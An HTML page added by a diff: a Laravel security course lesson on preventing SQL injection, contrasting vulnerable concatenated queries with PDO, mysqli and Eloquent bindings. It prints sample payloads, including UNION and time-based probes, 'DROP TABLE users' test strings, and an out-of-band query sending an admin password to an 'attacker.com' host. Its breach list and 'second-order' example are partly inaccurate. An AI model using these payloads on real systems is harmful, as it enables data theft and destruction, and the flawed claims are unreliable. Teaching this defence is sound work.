@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL Injection Prevention — Laravel Security Masterclass</title>
+  <meta name="description" content="SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in database queries. Attackers can insert malicious SQL code into queries,">
+  <link rel="canonical" href="https://techtalks.itsumarfarooq.com/security/laravel/sql-injection.html">
+
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://techtalks.itsumarfarooq.com/security/laravel/sql-injection.html">
+  <meta property="og:title" content="SQL Injection Prevention — Laravel Security Masterclass">
+  <meta property="og:description" content="SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in database queries. Attackers can insert malicious SQL code into queries,">
+  <meta property="og:image" content="https://techtalks.itsumarfarooq.com/assets/img/social-preview.png">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@umartechtalks">
+  <meta name="twitter:creator" content="@umartechtalks">
+  <meta name="twitter:title" content="SQL Injection Prevention — Laravel Security Masterclass">
+  <meta name="twitter:description" content="SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in database queries. Attackers can insert malicious SQL code into queries,">
+  <meta name="twitter:image" content="https://techtalks.itsumarfarooq.com/assets/img/social-preview.png">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/css/styles.css">
+
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "TechArticle",
+      "headline": "SQL Injection Prevention",
+      "description": "SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in database queries. Attackers can insert malicious SQL code into queries, pote",
+      "author": {
+        "@type": "Person",
+        "name": "Umar Farooq",
+        "email": "contact@itsumarfarooq.com",
+        "url": "https://itsumarfarooq.com",
+        "jobTitle": "Senior Full-Stack & Security Engineer",
+        "sameAs": [
+          "https://github.com/umar-444",
+          "https://linkedin.com/in/umar444",
+          "https://x.com/umartechtalks",
+          "https://worldwebtree.com"
+        ]
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "UmarTechTalks",
+        "url": "https://techtalks.itsumarfarooq.com"
+      },
+      "datePublished": "2026-10-21",
+      "dateModified": "2026-10-21"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://techtalks.itsumarfarooq.com/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Security Hub",
+          "item": "https://techtalks.itsumarfarooq.com/security/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Laravel Track",
+          "item": "https://techtalks.itsumarfarooq.com/security/laravel/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 4,
+          "name": "SQL Injection Prevention",
+          "item": "https://techtalks.itsumarfarooq.com/security/laravel/sql-injection.html"
+        }
+      ]
+    }
+  ]
+}
+  </script>
+</head>
+<body class="bg-surface text-ink dark:bg-dark-bg dark:text-dark-text min-h-screen flex flex-col font-sans transition-colors duration-150">
+
+  <!-- Reading Progress Bar -->
+  <div class="fixed top-0 left-0 w-full h-1 z-50 bg-surface-hairline dark:bg-dark-border">
+    <div id="reading-progress-bar" class="h-full bg-primary w-0 transition-all duration-75"></div>
+  </div>
+
+  <!-- Header -->
+  <header class="sticky top-0 z-40 bg-white/95 dark:bg-dark-bg/95 backdrop-blur-md border-b border-surface-hairline dark:border-dark-border">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
+      <a href="/" class="flex items-center gap-2.5 font-bold text-lg text-ink dark:text-white tracking-tight">
+        <span class="w-8 h-8 rounded-sm bg-primary flex items-center justify-center text-white text-sm font-bold shadow-soft">UT</span>
+        <span>Umar<span class="text-primary">TechTalks</span></span>
+      </a>
+
+      <nav class="hidden md:flex items-center gap-1 text-[15px] font-medium">
+        <a href="/" class="button-ghost ">Home</a>
+        <a href="/security/" class="button-ghost ">Security Hub</a>
+        <a href="/security/laravel/" class="button-ghost text-primary font-semibold">Laravel Track</a>
+        <a href="/security/laravel/checklist.html" class="button-ghost ">Checklist</a>
+        <a href="https://itsumarfarooq.com" target="_blank" rel="noopener noreferrer" class="button-ghost text-xs uppercase tracking-wider text-ink-muted">Portfolio &nearr;</a>
+      </nav>
+
+      <div class="flex items-center gap-2.5">
+        <button type="button" data-theme-toggle class="button-ghost p-2" aria-label="Toggle color theme">
+          <svg class="w-4 h-4 hidden dark:block" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+          <svg class="w-4 h-4 block dark:hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+        </button>
+
+        <a href="https://github.com/Umar-444/Techtalks-stack-kits" target="_blank" rel="noopener noreferrer" class="button-primary text-xs hidden sm:inline-flex gap-1.5 items-center">
+          <svg class="w-3.5 h-3.5 fill-current" viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+          <span>Star on GitHub</span>
+        </a>
+      </div>
+    </div>
+  </header>
+
+  <main class="flex-grow max-w-4xl mx-auto px-4 sm:px-6 py-10 w-full">
+    <!-- Breadcrumb -->
+    <nav class="flex items-center gap-2 text-xs text-ink-secondary dark:text-dark-muted mb-8" aria-label="Breadcrumb">
+      <a href="/" class="hover:text-primary transition-colors">Home</a>
+      <span>/</span>
+      <a href="/security/" class="hover:text-primary transition-colors">Security Hub</a>
+      <span>/</span>
+      <a href="/security/laravel/" class="hover:text-primary transition-colors">Laravel Track</a>
+      <span>/</span>
+      <span class="text-ink dark:text-white font-medium">SQL Injection Prevention</span>
+    </nav>
+
+    <!-- Lesson Header -->
+    <div class="mb-8">
+      <div class="flex flex-wrap items-center gap-2 mb-3">
+        <span class="chip-lavender text-xs px-2.5 py-0.5">Track 03</span>
+        <span class="chip-blue text-xs px-2.5 py-0.5">Lesson 07</span>
+      </div>
+      <h1 class="text-3xl sm:text-4xl font-extrabold text-ink dark:text-white tracking-[-0.035em] leading-tight">
+        SQL Injection Prevention
+      </h1>
+      <div class="flex items-center gap-3 text-xs text-ink-muted mt-3">
+        <span>Curated by Umar Farooq</span>
+        <span>&bull;</span>
+        <span>10 min read</span>
+      </div>
+    </div>
+
+    <!-- Quick Answer Box -->
+    <div class="quick-answer">
+      <div class="quick-answer-badge">Quick Answer &amp; Core Takeaway</div>
+      <p class="text-ink dark:text-white font-medium text-[15px] leading-relaxed">
+        SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in database queries. Attackers can insert malicious SQL code into queries, potentially allowing them to:
+      </p>
+    </div>
+
+    <!-- Content -->
+    <div class="lesson-content my-8">
+      <h1>SQL Injection Prevention</h1>
+<h2 class="text-2xl font-bold text-ink dark:text-white mt-10 mb-4 pb-2 border-b border-surface-hairline dark:border-dark-border tracking-tight">What is SQL Injection?</h2>
+<p class="text-ink-secondary dark:text-dark-muted leading-relaxed my-3.5 text-[15px]">SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in database queries. Attackers can insert malicious SQL code into queries, potentially allowing them to:</p>
+<ul class="space-y-2 my-4 text-[15px] text-ink-secondary dark:text-dark-muted list-disc list-inside">
+<li><strong>Read sensitive data</strong> - Access confidential information</li>
+<li><strong>Modify data</strong> - Alter or delete database records</li>
+<li><strong>Execute administrative operations</strong> - Drop tables, create users</li>
+<li><strong>Bypass authentication</strong> - Login without valid credentials</li>
+<li><strong>Execute system commands</strong> - In some database systems</li>
+</ul>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">How SQL Injection Happens</h3>
+<p class="text-ink-secondary dark:text-dark-muted leading-relaxed my-3.5 text-[15px]">SQL injection occurs when user input is directly concatenated into SQL queries without proper sanitization or parameterization.</p>
+<h4 class="text-base font-semibold text-ink/90 dark:text-dark-text mt-6 mb-2">The Vulnerable Pattern</h4>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-coral font-bold text-[11px]">[INSECURE] Vulnerable Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">// VULNERABLE: Direct string concatenation
+$userId = $_GET['id'];
+$query = &quot;SELECT * FROM users WHERE id = &quot; . $userId;
+
+// If attacker inputs: 1 OR 1=1
+// Query becomes: SELECT * FROM users WHERE id = 1 OR 1=1
+// This returns ALL users!
+</code></pre>
+</div>
+<h4 class="text-base font-semibold text-ink/90 dark:text-dark-text mt-6 mb-2">Real-World Impact</h4>
+<ul class="space-y-2 my-4 text-[15px] text-ink-secondary dark:text-dark-muted list-disc list-inside">
+<li><strong>2011 Sony Pictures hack</strong>: 77 million accounts compromised</li>
+<li><strong>2014 Heartland Payment Systems</strong>: 130 million credit cards stolen</li>
+<li><strong>2018 Marriott breach</strong>: 500 million guest records exposed</li>
+<li><strong>2021 T-Mobile hack</strong>: 47 million customer records accessed</li>
+</ul>
+<h2 class="text-2xl font-bold text-ink dark:text-white mt-10 mb-4 pb-2 border-b border-surface-hairline dark:border-dark-border tracking-tight">Understanding SQL Injection Types</h2>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">1. Classic SQL Injection</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-sql">-- Attacker input: ' OR '1'='1
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">2. Union-Based Injection</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-sql">-- Attacker input: 1 UNION SELECT username, password FROM admin
+SELECT * FROM products WHERE id = 1 UNION SELECT username, password FROM admin
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">3. Blind SQL Injection</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-sql">-- No visible results, but timing or boolean responses reveal data
+SELECT * FROM users WHERE id = 1 AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">4. Out-of-Band Injection</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-sql">-- Data exfiltrated via DNS or HTTP requests
+SELECT * FROM users WHERE id = 1 AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM admin), '.attacker.com\\abc'))
+</code></pre>
+</div>
+<h2 class="text-2xl font-bold text-ink dark:text-white mt-10 mb-4 pb-2 border-b border-surface-hairline dark:border-dark-border tracking-tight">PHP Prepared Statements</h2>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">The Solution: Parameterized Queries</h3>
+<p class="text-ink-secondary dark:text-dark-muted leading-relaxed my-3.5 text-[15px]">Prepared statements separate SQL code from data, making injection impossible.</p>
+<h4 class="text-base font-semibold text-ink/90 dark:text-dark-text mt-6 mb-2">Basic Prepared Statement</h4>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-emerald font-bold text-[11px]">[SECURE] Hardened Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">&lt;?php
+// Secure PDO example
+$pdo = new PDO(&quot;mysql:host=localhost;dbname=test&quot;, &quot;user&quot;, &quot;pass&quot;, [
+    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
+    PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
+]);
+
+$userId = $_GET['id'] ?? 0;
+
+// [SECURE]: Prepared statement with parameter binding
+$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM users WHERE id = ?&quot;);
+$stmt-&gt;execute([$userId]);
+$user = $stmt-&gt;fetch();
+
+if ($user) {
+    echo &quot;Welcome, &quot; . htmlspecialchars($user['name']);
+} else {
+    echo &quot;User not found&quot;;
+}
+</code></pre>
+</div>
+<h4 class="text-base font-semibold text-ink/90 dark:text-dark-text mt-6 mb-2">Named Parameters</h4>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">// Using named parameters for clarity
+$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM users WHERE email = :email AND status = :status&quot;);
+$stmt-&gt;execute([
+    'email' =&gt; $email,
+    'status' =&gt; 'active'
+]);
+</code></pre>
+</div>
+<h4 class="text-base font-semibold text-ink/90 dark:text-dark-text mt-6 mb-2">Multiple Parameters</h4>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">// Insert with multiple parameters
+$stmt = $pdo-&gt;prepare(&quot;INSERT INTO users (name, email, password) VALUES (?, ?, ?)&quot;);
+$stmt-&gt;execute([$name, $email, $hashedPassword]);
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">mysqli Prepared Statements</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-emerald font-bold text-[11px]">[SECURE] Hardened Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">&lt;?php
+// mysqli alternative
+$mysqli = new mysqli(&quot;localhost&quot;, &quot;user&quot;, &quot;pass&quot;, &quot;test&quot;);
+
+// [SECURE]: mysqli prepared statement
+$stmt = $mysqli-&gt;prepare(&quot;SELECT * FROM users WHERE id = ?&quot;);
+$stmt-&gt;bind_param(&quot;i&quot;, $userId); // &quot;i&quot; for integer
+$stmt-&gt;execute();
+$result = $stmt-&gt;get_result();
+$user = $result-&gt;fetch_assoc();
+</code></pre>
+</div>
+<h2 class="text-2xl font-bold text-ink dark:text-white mt-10 mb-4 pb-2 border-b border-surface-hairline dark:border-dark-border tracking-tight">Laravel SQL Injection Prevention</h2>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">Eloquent ORM Protection</h3>
+<p class="text-ink-secondary dark:text-dark-muted leading-relaxed my-3.5 text-[15px]">Laravel's Eloquent ORM automatically protects against SQL injection through parameterized queries.</p>
+<h4 class="text-base font-semibold text-ink/90 dark:text-dark-text mt-6 mb-2">Safe Eloquent Queries</h4>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-emerald font-bold text-[11px]">[SECURE] Hardened Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">&lt;?php
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Model;
+
+class User extends Model
+{
+    protected $fillable = ['name', 'email', 'password'];
+
+    // [SECURE]: Eloquent automatically parameterizes
+    public static function findActiveUser($id)
+    {
+        return self::where('id', $id)
+                  -&gt;where('active', true)
+                  -&gt;first();
+    }
+
+    // [SECURE]: Mass assignment protection
+    public static function createUser(array $data)
+    {
+        return self::create($data); // Only fillable fields are used
+    }
+}
+</code></pre>
+</div>
+<h4 class="text-base font-semibold text-ink/90 dark:text-dark-text mt-6 mb-2">Query Builder Safety</h4>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-emerald font-bold text-[11px]">[SECURE] Hardened Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">&lt;?php
+use Illuminate\Support\Facades\DB;
+
+// [SECURE]: Query Builder automatically parameterizes
+$users = DB::table('users')
+    -&gt;where('email', $request-&gt;email)
+    -&gt;where('status', 'active')
+    -&gt;get();
+
+// [SECURE]: Named bindings
+$users = DB::select('SELECT * FROM users WHERE created_at &gt; :date', [
+    'date' =&gt; now()-&gt;subDays(30)
+]);
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">Raw Queries in Laravel</h3>
+<h4 class="text-base font-semibold text-ink/90 dark:text-dark-text mt-6 mb-2">DANGER: Raw Queries (When Used Incorrectly)</h4>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-coral font-bold text-[11px]">[INSECURE] Vulnerable Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">// [INSECURE] VULNERABLE: Direct string concatenation in Laravel
+$userId = $request-&gt;id;
+$users = DB::select(&quot;SELECT * FROM users WHERE id = {$userId}&quot;);
+// Same vulnerability as PHP direct concatenation!
+</code></pre>
+</div>
+<h4 class="text-base font-semibold text-ink/90 dark:text-dark-text mt-6 mb-2">SAFE: Raw Queries with Bindings</h4>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-emerald font-bold text-[11px]">[SECURE] Hardened Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">// [SECURE]: Raw queries with proper parameter binding
+$userId = $request-&gt;id;
+$users = DB::select('SELECT * FROM users WHERE id = ?', [$userId]);
+
+// [SECURE]: Named parameters
+$users = DB::select('SELECT * FROM users WHERE email = :email', [
+    'email' =&gt; $request-&gt;email
+]);
+</code></pre>
+</div>
+<h2 class="text-2xl font-bold text-ink dark:text-white mt-10 mb-4 pb-2 border-b border-surface-hairline dark:border-dark-border tracking-tight">Advanced SQL Injection Prevention</h2>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">Stored Procedures</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-sql">-- Create a stored procedure
+DELIMITER //
+CREATE PROCEDURE GetUserById(IN user_id INT)
+BEGIN
+    SELECT * FROM users WHERE id = user_id;
+END //
+DELIMITER ;
+
+-- Call from PHP (still needs parameter binding)
+$stmt = $pdo-&gt;prepare(&quot;CALL GetUserById(?)&quot;);
+$stmt-&gt;execute([$userId]);
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">Input Validation Before Queries</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">&lt;?php
+function getUserById($userId) {
+    // Validate input type and range
+    if (!is_numeric($userId) || $userId &lt;= 0 || $userId &gt; 999999) {
+        throw new InvalidArgumentException('Invalid user ID');
+    }
+
+    // Now it's safe to use in query
+    $stmt = $pdo-&gt;prepare(&quot;SELECT * FROM users WHERE id = ?&quot;);
+    $stmt-&gt;execute([$userId]);
+
+    return $stmt-&gt;fetch();
+}
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">Escaping as Last Resort</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-coral font-bold text-[11px]">[INSECURE] Vulnerable Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">&lt;?php
+// Only use when prepared statements aren't possible
+$userInput = $pdo-&gt;quote($userInput); // Adds quotes and escapes
+
+// But this is still vulnerable to certain attacks!
+// Always prefer prepared statements
+</code></pre>
+</div>
+<h2 class="text-2xl font-bold text-ink dark:text-white mt-10 mb-4 pb-2 border-b border-surface-hairline dark:border-dark-border tracking-tight">Common SQL Injection Vulnerabilities</h2>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">1. Dynamic Table Names</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-coral font-bold text-[11px]">[INSECURE] Vulnerable Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">// [INSECURE] VULNERABLE: Dynamic table name
+$table = $_GET['table'];
+$query = &quot;SELECT * FROM {$table}&quot;;
+
+// [SECURE]: Whitelist table names
+$allowedTables = ['users', 'products', 'orders'];
+if (!in_array($table, $allowedTables)) {
+    die('Invalid table');
+}
+$query = &quot;SELECT * FROM {$table}&quot;;
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">2. Dynamic Column Names</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-coral font-bold text-[11px]">[INSECURE] Vulnerable Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">// [INSECURE] VULNERABLE: Dynamic column
+$column = $_GET['sort'];
+$query = &quot;SELECT * FROM products ORDER BY {$column}&quot;;
+
+// [SECURE]: Whitelist columns
+$allowedColumns = ['name', 'price', 'created_at'];
+if (!in_array($column, $allowedColumns)) {
+    $column = 'created_at'; // Default
+}
+$query = &quot;SELECT * FROM products ORDER BY {$column}&quot;;
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">3. LIKE Queries</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-coral font-bold text-[11px]">[INSECURE] Vulnerable Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">// [INSECURE] VULNERABLE: Direct LIKE query
+$search = $_GET['search'];
+$query = &quot;SELECT * FROM products WHERE name LIKE '%{$search}%'&quot;;
+
+// [SECURE]: Prepared statement with wildcards
+$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM products WHERE name LIKE ?&quot;);
+$stmt-&gt;execute([&quot;%{$search}%&quot;]);
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">4. IN Clauses</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-coral font-bold text-[11px]">[INSECURE] Vulnerable Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">// [INSECURE] VULNERABLE: Dynamic IN clause
+$ids = $_GET['ids']; // &quot;1,2,3&quot; or &quot;1); DROP TABLE users; --&quot;
+$query = &quot;SELECT * FROM users WHERE id IN ({$ids})&quot;;
+
+// [SECURE]: Prepared statement with multiple parameters
+$ids = explode(',', $_GET['ids']);
+$placeholders = str_repeat('?,', count($ids) - 1) . '?';
+$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM users WHERE id IN ({$placeholders})&quot;);
+$stmt-&gt;execute($ids);
+</code></pre>
+</div>
+<h2 class="text-2xl font-bold text-ink dark:text-white mt-10 mb-4 pb-2 border-b border-surface-hairline dark:border-dark-border tracking-tight">Database-Specific Considerations</h2>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">MySQL</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-emerald font-bold text-[11px]">[SECURE] Hardened Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">// Set secure PDO options for MySQL
+$pdo = new PDO(&quot;mysql:host=localhost;dbname=test&quot;, &quot;user&quot;, &quot;pass&quot;, [
+    PDO::MYSQL_ATTR_INIT_COMMAND =&gt; &quot;SET NAMES utf8mb4&quot;,
+    PDO::MYSQL_ATTR_USE_BUFFERED_QUERY =&gt; true,
+    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
+]);
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">PostgreSQL</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">// PostgreSQL specific options
+$pdo = new PDO(&quot;pgsql:host=localhost;dbname=test&quot;, &quot;user&quot;, &quot;pass&quot;, [
+    PDO::PGSQL_ATTR_DISABLE_PREPARES =&gt; false, // Use prepared statements
+]);
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">SQL Server</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">// SQL Server parameterized queries
+$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM users WHERE id = :id&quot;);
+$stmt-&gt;bindParam(':id', $userId, PDO::PARAM_INT);
+$stmt-&gt;execute();
+</code></pre>
+</div>
+<h2 class="text-2xl font-bold text-ink dark:text-white mt-10 mb-4 pb-2 border-b border-surface-hairline dark:border-dark-border tracking-tight">Second-Order SQL Injection</h2>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">What is Second-Order SQL Injection?</h3>
+<p class="text-ink-secondary dark:text-dark-muted leading-relaxed my-3.5 text-[15px]">Second-order (or stored) SQL injection occurs when malicious data is stored in the database and later used in a vulnerable query.</p>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-coral font-bold text-[11px]">[INSECURE] Vulnerable Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">&lt;?php
+// Step 1: Attacker registers with malicious username
+// Username: admin'; --
+$username = &quot;admin'; --&quot;;
+$stmt = $pdo-&gt;prepare(&quot;INSERT INTO users (username) VALUES (?)&quot;);
+$stmt-&gt;execute([$username]);
+
+// Step 2: Later, vulnerable login query
+// [INSECURE] VULNERABLE: Second-order injection
+$username = $_POST['username'];
+$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM users WHERE username = '{$username}' AND password = ?&quot;);
+$stmt-&gt;execute([$password]);
+
+// The stored malicious username breaks out of the query:
+// SELECT * FROM users WHERE username = 'admin'; --' AND password = ?
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">Prevention</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-emerald font-bold text-[11px]">[SECURE] Hardened Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">&lt;?php
+// [SECURE]: Use prepared statements everywhere
+$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;);
+$stmt-&gt;execute([$username, $password]);
+
+// [SECURE]: Input validation on storage
+function validateUsername($username) {
+    if (!preg_match('/^[a-zA-Z0-9_-]{3,20}$/', $username)) {
+        throw new InvalidArgumentException('Invalid username');
+    }
+    return $username;
+}
+</code></pre>
+</div>
+<h2 class="text-2xl font-bold text-ink dark:text-white mt-10 mb-4 pb-2 border-b border-surface-hairline dark:border-dark-border tracking-tight">Testing for SQL Injection</h2>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">Manual Testing</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-bash"># Test common injection payloads
+?id=1'
+?id=1''
+?id=1 OR 1=1
+?id=1; DROP TABLE users; --
+?id=1 UNION SELECT * FROM information_schema.tables
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">Automated Testing Tools</h3>
